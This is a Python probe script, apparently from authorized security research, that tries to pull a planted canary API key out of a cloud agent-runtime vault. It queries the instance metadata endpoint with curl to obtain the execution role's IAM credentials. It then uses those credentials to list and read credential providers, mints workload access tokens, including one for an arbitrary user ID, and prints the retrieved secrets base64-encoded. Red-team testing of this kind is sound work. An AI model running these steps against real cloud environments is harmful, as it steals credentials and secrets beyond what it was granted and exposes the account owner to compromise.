"""
probe_stage5_vault.py — Stage 5 vault exfil re-test on modern Harness substrate.

Two paths to the vault canary on `acab088-vault-probe-apikey`:

  PATH A — Control-plane via SigV4. From inside the harness, IMDS hands back
  exec-role STS creds. Use them to call:
    POST /identities/ListApiKeyCredentialProviders   (list shape)
    POST /identities/GetApiKeyCredentialProvider     (does it return apiKey?)

  PATH B — Data-plane via workload access token. The platform's loopy.server
  receives a `workloadAccessToken` for the request. From inside the shell
  tool, AWS_WORKLOAD_ACCESS_TOKEN env-var is NOT set on PID 1 (we observed
  this in Stage 1.5). But we can mint our own via:
    POST /identities/workload-tokens   (GetWorkloadAccessTokenForUserId
    with userId=<arbitrary>, signed by exec-role)
  ... then pass that token to:
    POST /identities/api-key  (GetResourceApiKey)

  Both paths target the same canary value
  IDENT-APIKEY-CANARY-9F3E2B1A-DO-NOT-USE planted on `acab088-vault-probe-apikey`.

Authorized research; account owner is the test target.
"""

import os
import sys
import base64
import json
import subprocess
import urllib.request
import urllib.parse


def _b64(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.b64encode(data).decode()


def _run(cmd, timeout=10):
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=timeout)
        return r.returncode, r.stdout, r.stderr
    except Exception as e:
        return -1, b'', f'<{type(e).__name__}:{e}>'.encode()


def get_imds_creds():
    rc, tok, _ = _run([
        'curl', '-s', '-m', '5', '-X', 'PUT',
        'http://169.254.169.254/latest/api/token',
        '-H', 'X-aws-ec2-metadata-token-ttl-seconds: 60'])
    if rc != 0:
        return None
    token = tok.strip().decode()
    rc, role, _ = _run([
        'curl', '-s', '-m', '5',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        '-H', f'X-aws-ec2-metadata-token: {token}'])
    if rc != 0:
        return None
    role_name = role.strip().decode().splitlines()[0]
    rc, creds_b, _ = _run([
        'curl', '-s', '-m', '5',
        f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}',
        '-H', f'X-aws-ec2-metadata-token: {token}'])
    if rc != 0:
        return None
    try:
        return json.loads(creds_b.decode())
    except Exception:
        return None


def main():
    print('PROBE=stage5-vault v1')

    creds = get_imds_creds()
    if not creds:
        print('S5_IMDS_FAILED=1')
        print('END')
        return
    print(f'S5_AKIA_PREFIX={creds["AccessKeyId"][:6]}')

    # Stash for boto3
    os.environ['AWS_ACCESS_KEY_ID'] = creds['AccessKeyId']
    os.environ['AWS_SECRET_ACCESS_KEY'] = creds['SecretAccessKey']
    os.environ['AWS_SESSION_TOKEN'] = creds['Token']

    # Try boto3 — if not available, use raw SigV4. boto3 is in
    # /opt/amazon/lib/... per Stage 2.5's source dump (loopy uses it).
    try:
        import boto3
        from botocore.exceptions import ClientError
    except Exception as e:
        print(f'S5_BOTO_IMPORT_ERR={type(e).__name__}:{e}')
        print('END')
        return

    sts = boto3.client('sts', region_name='us-east-1')
    ctl = boto3.client('bedrock-agentcore-control', region_name='us-east-1')
    dp = boto3.client('bedrock-agentcore', region_name='us-east-1')

    # Sanity: who am I right now?
    try:
        whoami = sts.get_caller_identity()
        print(f'S5_STS_ARN={_b64(whoami["Arn"].encode())}')
        print(f'S5_STS_USERID={_b64(whoami["UserId"].encode())}')
    except Exception as e:
        print(f'S5_STS_ERR={type(e).__name__}:{e}')

    # PATH A.1 — list providers
    try:
        list_resp = ctl.list_api_key_credential_providers()
        print(f'S5_LIST_OK=1')
        names = [p.get('name') or p.get('credentialProviderName') for p in list_resp.get('credentialProviders', [])]
        print(f'S5_LIST_NAMES={_b64(json.dumps(names).encode())}')
    except ClientError as e:
        print(f'S5_LIST_CLIENT_ERROR={e.response["Error"]["Code"]}:'
              f'{e.response["Error"].get("Message","")[:200]}')
    except Exception as e:
        print(f'S5_LIST_ERR={type(e).__name__}:{str(e)[:200]}')

    # PATH A.2 — get the canary provider; does the response include apiKey?
    try:
        prov = ctl.get_api_key_credential_provider(
            name='acab088-vault-probe-apikey')
        # Dump every field of the response (sans HTTP metadata)
        prov.pop('ResponseMetadata', None)
        # Stringify any datetime fields
        def _s(o):
            if hasattr(o, 'isoformat'):
                return o.isoformat()
            return repr(o)
        print(f'S5_GET_PROV={_b64(json.dumps(prov, default=_s).encode())}')
    except ClientError as e:
        print(f'S5_GET_PROV_CLIENT_ERROR={e.response["Error"]["Code"]}:'
              f'{e.response["Error"].get("Message","")[:200]}')
    except Exception as e:
        print(f'S5_GET_PROV_ERR={type(e).__name__}:{str(e)[:200]}')

    # PATH B.1 — mint a workload access token via GetWorkloadAccessToken (no
    # userId) — we have a workload identity 'acab088-vault-probe-wi' on
    # account; let's try
    wat_token = None
    try:
        # GetWorkloadAccessToken with the workload-identity name
        wat = dp.get_workload_access_token(workloadName='acab088-vault-probe-wi')
        print('S5_GET_WAT_OK=1')
        if 'workloadAccessToken' in wat:
            wat_token = wat['workloadAccessToken']
            print(f'S5_WAT_LEN={len(wat_token)}')
            print(f'S5_WAT_HEAD={_b64(wat_token[:60].encode())}')
    except ClientError as e:
        print(f'S5_GET_WAT_CLIENT_ERROR={e.response["Error"]["Code"]}:'
              f'{e.response["Error"].get("Message","")[:200]}')
    except Exception as e:
        print(f'S5_GET_WAT_ERR={type(e).__name__}:{str(e)[:200]}')

    # PATH B.2 — call GetResourceApiKey with the workload token, asking for
    # the canary provider's resolved apiKey.
    if wat_token:
        try:
            api_key_resp = dp.get_resource_api_key(
                workloadIdentityToken=wat_token,
                resourceCredentialProviderName='acab088-vault-probe-apikey',
            )
            api_key_resp.pop('ResponseMetadata', None)
            print(f'S5_GET_RES_APIKEY={_b64(json.dumps(api_key_resp, default=str).encode())}')
        except ClientError as e:
            print(f'S5_GET_RES_APIKEY_CLIENT_ERROR={e.response["Error"]["Code"]}:'
                  f'{e.response["Error"].get("Message","")[:200]}')
        except Exception as e:
            print(f'S5_GET_RES_APIKEY_ERR={type(e).__name__}:{str(e)[:200]}')

    # PATH B.3 — try GetWorkloadAccessTokenForUserId with arbitrary userId
    # (this is thread01's primitive — see if it works from this default
    # exec-role)
    try:
        wat2 = dp.get_workload_access_token_for_user_id(
            workloadName='acab088-vault-probe-wi',
            userId='arbitrary-userid-stage5-' + os.urandom(4).hex(),
        )
        print(f'S5_GWAT_USERID_OK=1')
        if 'workloadAccessToken' in wat2:
            print(f'S5_GWAT_USERID_LEN={len(wat2["workloadAccessToken"])}')
    except ClientError as e:
        print(f'S5_GWAT_USERID_CLIENT_ERROR={e.response["Error"]["Code"]}:'
              f'{e.response["Error"].get("Message","")[:200]}')
    except Exception as e:
        print(f'S5_GWAT_USERID_ERR={type(e).__name__}:{str(e)[:200]}')

    # Bonus: also try GetWorkloadAccessTokenForJWT
    # (probably needs a JWT we don't have here)

    print('END')


if __name__ == '__main__':
    main()
